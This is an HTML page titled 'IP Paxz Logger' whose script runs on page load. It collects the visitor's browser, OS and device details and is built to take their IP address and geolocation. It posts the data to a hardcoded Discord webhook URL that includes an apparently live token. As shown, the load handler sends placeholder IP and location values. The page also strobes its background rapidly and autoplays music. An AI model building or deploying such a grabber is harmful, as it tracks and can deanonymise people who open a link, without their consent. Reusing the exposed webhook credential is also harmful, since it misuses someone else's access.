<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Paxz Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: white;
            color: black;
            animation: changeBackground 0.4s infinite;
            position: relative;
        }
        h1 {
            color: inherit;
        }
        p {
            color: inherit;
            margin-bottom: 40px;
        }
        @keyframes changeBackground {
            0% { background-color: white; color: black; }
            50% { background-color: black; color: white; }
            100% { background-color: white; color: black; }
        }
    </style>
    <script>
        var embedSent = false;
        startMusic();

        var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";

        function startMusic() {
            var audio = new Audio('music.mp3'); // Verander 'sound.mp3' naar 'music.mp3' voor het muziekbestand
            audio.loop = true; // Loop de muziek zodat het altijd afspeelt
            audio.play().catch(function(error) {
                console.error('Failed to play music:', error);
            });
        }

        function sendToDiscord(ipAddress, locationData) {
            console.log("IP Address:", ipAddress);
            console.log("Location Data:", locationData);

            var embedData = {
                "IP Address": ipAddress,
                "City": locationData.city,
                "Region": locationData.region,
                "Country": locationData.country_name,
                "Country Code": locationData.country_code,
                "Continent Code": locationData.continent_code,
                "Timezone": locationData.timezone,
                "Currency": locationData.currency,
                "Language": locationData.languages,
                "ASN": locationData.asn,
                "Organization": locationData.org
            };

            sendEmbed(embedData);
        }

        function sendEmbed(embedData) {
            if (embedSent) return; // Als embed al is verzonden, stoppen

            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            var os = detectOS(userAgent);
            console.log("Operating System:", os);
            var browser = detectBrowser(userAgent);
            console.log("Browser:", browser);
            var deviceType = getDeviceType(userAgent);
            console.log("Device Type:", deviceType);

            var embed = {
                "embeds": [
                    {
                        "title": "IP Paxz Logger",
                        "description": "A user has visited the page.",
                        "color": 65280, // Groen als het leuk is, Rood als het niet leuk is
                        "fields": [
                            {
                                "name": "IP Address",
                                "value": `\`\`\`${embedData["IP Address"]}\`\`\``
                            },
                            {
                                "name": "City",
                                "value": `\`\`\`${embedData["City"]}\`\`\``
                            },
                            {
                                "name": "Region",
                                "value": `\`\`\`${embedData["Region"]}\`\`\``
                            },
                            {
                                "name": "Country",
                                "value": `\`\`\`${embedData["Country"]}\`\`\``
                            },
                            {
                                "name": "Country Code",
                                "value": `\`\`\`${embedData["Country Code"]}\`\`\``
                            },
                            {
                                "name": "Continent Code",
                                "value": `\`\`\`${embedData["Continent Code"]}\`\`\``
                            },
                            {
                                "name": "Timezone",
                                "value": `\`\`\`${embedData["Timezone"]}\`\`\``
                            },
                            {
                                "name": "Currency",
                                "value": `\`\`\`${embedData["Currency"]}\`\`\``
                            },
                            {
                                "name": "Language",
                                "value": `\`\`\`${embedData["Language"]}\`\`\``
                            },
                            {
                                "name": "ASN",
                                "value": `\`\`\`${embedData["ASN"]}\`\`\``
                            },
                            {
                                "name": "Organization",
                                "value": `\`\`\`${embedData["Organization"]}\`\`\``
                            }
                        ],
                        "footer": {
                            "text": "Info generated by Paxz!!!"
                        }
                    }
                ]
            };

            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        console.log("Embed sent successfully!");
                        embedSent = true; // Set embedSent to true after successfully sending the embed
                    } else {
                        console.error("Failed to send embed:", xhr.status, xhr.statusText);
                    }
                }
            };
            xhr.send(JSON.stringify(embed));
        }

        function detectOS(userAgent) {
            var OSes = [
                'Windows',
                'Mac OS',
                'Linux',
                'iOS',
                'Android'
            ];

            var detectedOS = OSes.find(function(os) {
                return userAgent.indexOf(os) >= 0;
            });

            return detectedOS || 'Unknown';
        }

        function detectBrowser(userAgent) {
            var browsers = [
                'Chrome',
                'Firefox',
                'Safari',
                'Edge',
                'Opera',
                'MSIE',
                'Trident',
                'Edge',
                'Netscape',
                'SeaMonkey',
                'UCBrowser',
                'Vivaldi',
                'Yandex',
                'Brave',
                'Avant',
                'Konqueror',
                'Lunascape',
                'Maxthon',
                'Sleipnir',
                'SlimBrowser'
            ];

            var detectedBrowser = browsers.find(function(browser) {
                return userAgent.indexOf(browser) >= 0;
            });

            return detectedBrowser || 'Unknown';
        }

        function getDeviceType(userAgent) {
            if (userAgent.includes("Mobile")) {
                return userAgent.includes("iPad") ? "iPad" : userAgent.includes("iPhone") ? "iPhone" : "Phone";
            }
            if (userAgent.includes("Tablet")) return "Tablet";
            if (userAgent.includes("Console")) return "Console";
            if (userAgent.includes("Windows")) return "PC / Computer";
            return "Unknown Device";
        }

        window.onload = function() {
            sendToDiscord("127.0.0.1", {
                city: "Unknown",
                region: "Unknown",
                country_name: "Unknown",
                country_code: "Unknown",
                continent_code: "Unknown",
                timezone: "Unknown",
                currency: "Unknown",
                languages: "Unknown",
                asn: "Unknown",
                org: "Unknown"
            }); // Stuur een dummy-embed bij het laden van de pagina
        }
    </script>
</head>
<body>
    <h1>Welcome to our awesome site!</h1>
    <p>Enjoy the music while we log your IP address.</p>
</body>
</html>
